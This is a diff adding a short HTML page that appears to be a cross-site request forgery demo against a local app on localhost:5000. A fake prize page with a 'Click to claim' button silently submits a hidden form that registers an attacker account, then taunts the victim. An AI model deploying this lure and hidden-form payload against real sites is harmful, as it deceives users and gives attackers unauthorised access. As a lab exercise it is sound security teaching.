@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+    <head>
+        <title>YOU HAVE WON!</title>
+    </head>
+    <body>  
+        <form hidden id="hack" target="csrf-frame" action="http://localhost:5000/signup.html" method="POST" autocomplete="off">
+            <input name="username" value="give_me_access">
+            <input name="password" value="abc123">
+            <input name="dob" value="01/01/2001">
+        </form>
+        <iframe hidden name="csrf-frame"></iframe>
+        <h3>You won $100,000</h3>
+        <button onClick="hack();" id="button">Click to claim</button>
+        <br>
+        <div id="warning"></div>
+        <script>
+            function hack() {
+                document.getElementById("hack").submit();
+                document.getElementById("warning").innerHTML="<p>HA HA HA! You have been hacked!</p><p>Go on, check your user database, we have access to your site!</p>";
+            }
+        </script>
+    </body>
+</html>
